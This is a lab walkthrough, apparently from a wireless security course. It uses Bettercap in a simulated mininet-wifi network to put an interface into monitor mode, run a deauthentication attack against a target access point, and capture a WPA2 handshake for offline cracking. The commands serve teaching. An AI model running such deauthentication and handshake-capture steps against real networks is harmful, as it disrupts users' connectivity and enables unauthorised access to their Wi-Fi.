# Summary
In this lab we hope to familiarize ourselves with the tool Bettercap, a common wireless auditing tool.

# Getting Started with Bettercap
Select "**Bettercap Recon**" from the menu. Allow up to 30 seconds to initialize the network. 

![[Pasted image 20250317233629.png]]

*Note: normally, when using Bettercap with physical network cards, it is necessary to use “airmon-ng check kill” to kill processes that may interfere with Bettercap. However, running this command in the mininet-wifi network is unnecessary and may cause the environment to fail.*

Start by putting the interface `Attacker-wlan0` in monitor mode.

```bash
airmon-ng start Attacker-wlan0
```

If the following prompt appears, input "**y**" and hit enter. 

![[Pasted image 20250317234041.png]]

Successful initialization will appear as pictured below.

![[Pasted image 20250317234109.png]]

Verify that the interface has been put into monitor mode using the following command. Look for `Mode:Monitor`:

```bash
iwconfig
```

As pictured below, the interface `wlan0mon` should now be present in monitor mode.

![[Pasted image 20250317234159.png]]

Launch Bettercap with the following command to interact with the interface `wlan0mon` the interface we previously put in monitor mode. 

```bash
bettercap -iface wlan0mon
```

You will be greeted by a prompt of with the name of the network interface. 

![[Pasted image 20250317234243.png]]

The following commands will configure the console for a more understandable workflow to view the de-authentication attack.

```bash
set wifi.show.sort clients desc
set ticker.commands 'clear; wifi.show'
ticker on
set wifi.show.sort clients desc
```

After running the commands, you should see the following on your screen. 

![[Pasted image 20250317234426.png]]

Disable console logging using the following command. Note that the monitor interface has not stopped channel hopping. 

```bash
events.stream off
```

Set the handshakes file and enable the `wifi.recon` module. Note that your command line may dissappear during the refresh. Hitting enter will bring it back. 

```bash
set wifi.handshakes.file ./loot/4whs
wifi.recon on
```

Next, force the interface to only operate on channel 6

```bash
wifi.recon.channel 6
```

Start the de-authentication attack using the command below: 

```
wifi.deauth 76:df:71:67:40:2b
```

It may take a few seconds, but Bettercap will catch the handshake as shown below. A handshake is essentially an encrypted WPA2 password intercepted from between the client and router than can be decrypted offline.

![[Pasted image 20250318000519.png]]

Your final packet count may differ from the screenshot below. 

NEXT LAB: [[Lab 02 - Bettercap Wi-Fi Authentication Capture]]


